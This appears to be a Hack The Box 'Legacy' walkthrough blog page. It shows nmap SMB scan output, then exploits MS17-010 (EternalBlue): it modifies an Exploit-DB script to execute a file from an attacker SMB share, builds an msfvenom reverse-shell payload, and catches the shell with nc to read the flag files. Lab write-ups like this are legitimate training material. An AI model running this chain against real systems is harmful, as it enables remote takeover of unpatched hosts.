+<span style="color:#960050;background-color:#1e0010">|</span>   Master Browser
+<span style="color:#960050;background-color:#1e0010">|</span>     LEGACY  <span style="color:#ae81ff">5</span>.1  
+<span style="color:#960050;background-color:#1e0010">|</span>   Potential Browser
+<span style="color:#960050;background-color:#1e0010">|</span>     LEGACY  <span style="color:#ae81ff">5</span>.1  
+<span style="color:#960050;background-color:#1e0010">|</span>   Server service
+<span style="color:#960050;background-color:#1e0010">|</span>     LEGACY  <span style="color:#ae81ff">5</span>.1  
+<span style="color:#960050;background-color:#1e0010">|</span>   Windows NT/2000/XP/2003 server
+<span style="color:#960050;background-color:#1e0010">|</span>     LEGACY  <span style="color:#ae81ff">5</span>.1  
+<span style="color:#960050;background-color:#1e0010">|</span>   Workstation
+|_    LEGACY  <span style="color:#ae81ff">5</span>.1  
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-os-discovery:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">OS:</span> Windows XP (Windows <span style="color:#ae81ff">2000</span> LAN Manager)
+<span style="color:#960050;background-color:#1e0010">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
+<span style="color:#960050;background-color:#1e0010">|</span>   Computer name: legacy
+<span style="color:#960050;background-color:#1e0010">|</span>   NetBIOS computer name: LEGACY\x00
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">Workgroup:</span> <span style="color:#960050;background-color:#1e0010">HTB\</span>x00
+|_  System time: <span style="color:#ae81ff">2021</span>-01-07T05:42:05+02:00
+<span style="color:#960050;background-color:#1e0010">|_smb-print-text:</span> false
+| smb-protocols: 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">dialects:</span> 
+<span style="color:#960050;background-color:#1e0010">|_</span>    NT LM <span style="color:#ae81ff">0</span>.12 (SMBv1) [dangerous, but default]
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-security-mode:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">account_used:</span> guest
+|   authentication_level: <span style="color:#66d9ef">user</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">challenge_response:</span> supported
+|_  message_signing: disabled (dangerous, but default)
+<span style="color:#960050;background-color:#1e0010">|_smb-vuln-ms10-061:</span> <span style="color:#960050;background-color:#1e0010">ERROR:</span> Script execution failed (use -d to <span style="color:#66d9ef">debug</span>)
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">smb-vuln-ms17-010:</span> 
+<span style="color:#960050;background-color:#1e0010">|</span>   <span style="color:#960050;background-color:#1e0010">VULNERABLE:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+<span style="color:#960050;background-color:#1e0010">|</span>     <span style="color:#960050;background-color:#1e0010">State:</span> VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+<span style="color:#960050;background-color:#1e0010">|</span>     Risk factor: HIGH
+<span style="color:#960050;background-color:#1e0010">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
+<span style="color:#960050;background-color:#1e0010">|</span>        servers (ms17-010).
+<span style="color:#960050;background-color:#1e0010">|</span>           
+<span style="color:#960050;background-color:#1e0010">|</span>     Disclosure date: <span style="color:#ae81ff">2017</span>-03-14
+<span style="color:#960050;background-color:#1e0010">|</span>     <span style="color:#960050;background-color:#1e0010">References:</span>
+<span style="color:#960050;background-color:#1e0010">|</span>       <span style="color:#960050;background-color:#1e0010">https://cve</span>.<span style="color:#960050;background-color:#1e0010">mitre</span>.<span style="color:#960050;background-color:#1e0010">org/cgi-bin/cvename</span>.<span style="color:#960050;background-color:#1e0010">cgi?name=CVE-2017-0143</span>
+<span style="color:#960050;background-color:#1e0010">|</span>       <span style="color:#960050;background-color:#1e0010">https://technet</span>.<span style="color:#960050;background-color:#1e0010">microsoft</span>.<span style="color:#960050;background-color:#1e0010">com/en-us/library/security/ms17-010</span>.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+<span style="color:#960050;background-color:#1e0010">|_smb2-capabilities:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t establish a SMBv2 connection.
+<span style="color:#960050;background-color:#1e0010">|_smb2-security-mode:</span> <span style="color:#960050;background-color:#1e0010">Couldn&#39;</span>t establish a SMBv2 connection.
+<span style="color:#960050;background-color:#1e0010">|_smb2-time:</span> Protocol negotiation failed (SMB2)
+
+Read data files from: <span style="color:#e6db74">/usr/bin/../share/nmap</span>
+Service detection performed. Please report <span style="color:#66d9ef">any</span> incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jan  2 01:45:55 2021 -- 1 IP address (1 host up) scanned in 135.54 seconds</span>
+</code></pre></div><h2 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>searchsploit ms17-010
+<img src="/htb-legacy/searchsploit.png" alt="searchsploit"></p>
+<p>Exploit code: <a href="https://www.exploit-db.com/exploits/42315">https://www.exploit-db.com/exploits/42315</a></p>
+<p>Modify <code>smb_pwn</code> function</p>
+<p>comment out</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#print(&#39;creating file c:\\pwned.txt on the target&#39;)</span>
+<span style="color:#75715e">#tid2 = smbConn.connectTree(&#39;C$&#39;)</span>
+<span style="color:#75715e">#fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)</span>
+<span style="color:#75715e">#smbConn.closeFile(tid2, fid2)</span>
+<span style="color:#75715e">#smbConn.disconnectTree(tid2)</span>
+</code></pre></div><p>Add</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">service_exec(conn, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;cmd /c </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">10.10.14.29\PWN\1.exe&#39;</span>)
+</code></pre></div><p>Generate TCP reverse shell with <code>msfvenom</code></p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f exe &gt; 1.exe
+</code></pre><p><img src="/htb-legacy/msfvenom.png" alt="msfvenom"></p>
+<p>host payload over SMB</p>
+<pre><code>sudo python3 impacket/examples/smbserver.py PWN .	
+</code></pre><p><img src="/htb-legacy/smbserver.png" alt="msfvenom"></p>
+<p>Run exploit</p>
+<pre><code>python eternalblue.py 10.10.10.4
+</code></pre><p><img src="/htb-legacy/exploit.png" alt="msfvenom"></p>
+<p>catch reverse shell with nc</p>
+<pre><code>sudo nc -lvp 443
+</code></pre><p><img src="/htb-legacy/nc.png" alt="msfvenom"></p>
+<p>Get user.txt</p>
+<pre><code>type &quot;C:\Documents and Settings\john\Desktop\user.txt&quot; &amp;&amp; ipconfig
+</code></pre><p><img src="/htb-legacy/user.png" alt="msfvenom"></p>
+<h2 id="root-flag">Root Flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Get root.txt</p>
+<pre><code>type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot; &amp;&amp; ipconfig
+</code></pre><p><img src="/htb-legacy/root.png" alt="msfvenom"></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/htb-buff/">
+                <span class="button__text">Hack The Box :: Buff</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
